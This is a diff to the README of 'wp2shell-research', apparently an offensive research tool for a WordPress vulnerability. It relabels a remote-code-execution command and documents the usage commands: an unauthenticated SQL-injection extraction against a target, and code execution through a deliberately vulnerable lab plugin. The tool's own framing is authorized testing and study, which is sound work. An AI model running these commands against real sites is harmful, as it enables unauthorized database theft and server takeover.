@@ -48,7 +48,7 @@ wp2shell-research/
 │   ├── USAGE.md          # step-by-step usage
 │   ├── analysis.md       # full technical analysis + defensive measures
 │   └── weaponization-gap.md
-├── lab/acme-templates.php  # deliberately-vulnerable plugin for the write-exec demo
+├── lab/acme-templates.php  # deliberately-vulnerable plugin for the plugin-rce demo
 ├── AUTHORIZATION.md
 ├── LICENSE               # MIT
 └── pyproject.toml
@@ -81,21 +81,26 @@ wp2shell sqli http://TARGET/
 # 3) Extract anything
 wp2shell sqli http://TARGET/ --expr "SELECT COUNT(*) FROM wp_users"
 
-# 4) Prove code execution (write a benign PHP file the server runs; needs a vulnerable
-#    plugin write route — install lab/acme-templates.php on a test instance first)
-wp2shell write-exec http://TARGET/
+# 4) (lab) Prove code execution via a VULNERABLE PLUGIN route — install
+#    lab/acme-templates.php on a test instance first. This is NOT a core capability.
+wp2shell plugin-rce http://TARGET/
 #   [+] server EXECUTED the PHP -> 42-wp2shell-exec-poc
 ```
 
 ## Commands
 
-**Assessment** — point these at an authorized target:
+**Assessment** — clean core, point these at an authorized target:
 
 | Command | Impact | Purpose |
 |---|---|---|
 | `check` | none | Detector — VULNERABLE / NOT VULNERABLE (exit 1 / 0). |
-| `sqli` | DB read | Unauthenticated UNION/blind SQL injection (CVE-2026-60137 via 63030). |
-| `write-exec` | code exec | Drops a benign PHP file (default: prints `6*7`) via the desync's sanitization bypass and proves the server **executes** it. Needs a vulnerable plugin write route — the bundled `lab/acme-templates.php` models one; auto-cleans the file. |
+| `sqli` | DB read | Unauthenticated UNION/blind SQL injection (CVE-2026-60137 via 63030), no plugins. |
+
+**Lab** — needs a deliberately-vulnerable plugin you install yourself:
+
+| Command | Impact | Purpose |
+|---|---|---|
+| `plugin-rce` | code exec | Writes a benign PHP file (default: prints `6*7`) to a **vulnerable plugin** write route via the desync's sanitization bypass and proves the server **executes** it. Models the real-world plugin-exposure class — stock core has no such unauth write sink. Auto-cleans the file. |
 
 **Research** — raw desync primitives for studying the bug (not scanners):
 
